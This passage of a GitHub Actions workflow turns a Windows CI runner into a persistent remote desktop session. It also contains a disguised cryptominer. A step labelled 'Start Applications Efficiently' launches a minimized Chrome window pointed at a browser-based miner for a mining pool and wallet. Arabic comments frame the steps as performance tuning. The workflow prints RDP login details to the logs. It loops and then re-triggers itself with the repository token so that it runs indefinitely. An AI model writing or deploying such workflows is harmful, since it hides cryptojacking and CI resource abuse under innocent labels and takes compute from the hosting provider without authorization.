      - name: Optimize System Performance
        shell: pwsh
        run: |
          # تحسينات أداء معقولة
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c  # High performance
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 38

      - name: Start Applications Efficiently
        shell: pwsh
        run: |
          $url="https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=4"
          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
            -ArgumentList "--new-window","--app=$url" `
            -WindowStyle Minimized

      - name: Print Connection Info
        shell: pwsh
        run: |
          Write-Host "==============================="
          Write-Host "   RDP SESSION DETAILS"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "==============================="

      - name: Maintain Session
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          $limit = 350
          for ($i=1; $i -le $limit; $i++) {
            Write-Host "[$(Get-Date)] Session active ($i/$limit)"
            # نشاط خفيف للحفاظ على الجلسة
            if ($i % 30 -eq 0) {
              Get-Date | Out-File "$env:TEMP\keepalive.txt" -Append
            }
            Start-Sleep -Seconds 60
          }
          # إعادة البناء التلقائي
          gh workflow run $env:GITHUB_WORKFLOW --ref $env:GITHUB_REF_NAME --repo $env:GITHUB_REPOSITORY
          Start-Sleep -Seconds 20
